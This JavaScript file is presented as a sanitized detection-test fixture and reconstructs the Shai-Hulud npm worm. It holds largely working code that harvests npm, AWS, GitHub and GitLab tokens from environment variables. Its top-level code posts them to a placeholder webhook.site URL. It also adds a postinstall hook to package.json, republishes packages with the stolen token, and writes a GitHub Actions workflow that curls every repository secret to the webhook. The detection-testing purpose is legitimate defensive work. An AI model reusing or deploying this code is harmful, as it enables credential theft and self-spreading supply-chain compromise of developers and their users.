// SANITIZED TEST FIXTURE — reconstructed from public IOCs for detection testing
// Shai-Hulud Worm Pattern (Nov 2025)
// Source: Aikido "S1ngularity/nx attackers strike again" and "Shai-Hulud Strikes Again"
// Pattern: postinstall worm propagation, npm republish, GitHub Actions abuse, webhook exfil

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const https = require('https');

// Scan process.env for secrets
function scanEnvForSecrets() {
    const secrets = {};
    const secretPatterns = [
        { key: 'NPM_TOKEN', pattern: /npm_[a-zA-Z0-9]{36}/ },
        { key: 'AWS_ACCESS_KEY', pattern: /AKIA[0-9A-Z]{16}/ },
        { key: 'GITHUB_TOKEN', pattern: /gh[pousr]_[a-zA-Z0-9]{36}/ },
        { key: 'GITLAB_TOKEN', pattern: /glpat-[a-zA-Z0-9\-]{20}/ }
    ];
    
    for (const [envKey, envValue] of Object.entries(process.env)) {
        for (const { key, pattern } of secretPatterns) {
            if (pattern.test(envValue)) {
                secrets[envKey] = envValue;
            }
        }
    }
    
    return secrets;
}

// Fetch package tarball from npm registry
function fetchPackageTarball(packageName, version) {
    const url = `https://registry.npmjs.org/${packageName}/-/${packageName}-${version}.tgz`;
    // In real worm, this would download and extract the tarball
    return url;
}

// Modify package.json to insert postinstall hook
function modifyPackageJson(tarballPath) {
    const packageJsonPath = path.join(tarballPath, 'package.json');
    const pkg = JSON.parse(fs.readFileSync(packageJsonPath, 'utf8'));
    
    // Insert postinstall hook
    pkg.scripts = pkg.scripts || {};
    pkg.scripts.postinstall = 'node bundle.js';
    
    // Bump patch version
    const [major, minor, patch] = pkg.version.split('.').map(Number);
    pkg.version = `${major}.${minor}.${patch + 1}`;
    
    fs.writeFileSync(packageJsonPath, JSON.stringify(pkg, null, 2));
    return pkg;
}

// Create GitHub Actions workflow for secret exfiltration
function createGithubActionsWorkflow(repoPath) {
    const workflowDir = path.join(repoPath, '.github', 'workflows');
    fs.mkdirSync(workflowDir, { recursive: true });
    
    const workflowContent = `
name: CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Debug Output
        run: echo "${'${{ toJSON(secrets) }}'}"
      - name: Exfil
        run: |
          curl -X POST https://webhook.site/xxxx-xxxx-xxxx \
            -d "${'${{ toJSON(secrets) }}'}"
    `;
    
    fs.writeFileSync(
        path.join(workflowDir, 'shai-hulud-workflow.yml'),
        workflowContent
    );
}

// Exfiltrate secrets via webhook
function exfiltrateViaWebhook(secrets) {
    const webhookUrl = 'https://webhook.site/xxxx-xxxx-xxxx'; // SANITIZED
    const data = JSON.stringify({
        secrets: secrets,
        double_encoded: Buffer.from(JSON.stringify(secrets)).toString('base64')
    });
    
    https.request(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' }
    }, (res) => {
        // Ignore response
    }).end(data);
}

// Re-publish modified package
function republishPackage(tarballPath, authToken) {
    try {
        execSync(`npm publish --registry https://registry.npmjs.org`, {
            cwd: tarballPath,
            env: { ...process.env, NODE_AUTH_TOKEN: authToken }
        });
    } catch (e) {
        // Publish may fail
    }
}

// Main worm execution
const stolenSecrets = scanEnvForSecrets();
exfiltrateViaWebhook(stolenSecrets);

// If we have npm token, attempt to worm propagate
if (stolenSecrets.NPM_TOKEN) {
    const packageName = process.env.npm_package_name || 'target-package';
    const packageVersion = process.env.npm_package_version || '1.0.0';
    
    // In real worm: download, modify, republish
    // createGithubActionsWorkflow(process.cwd());
}
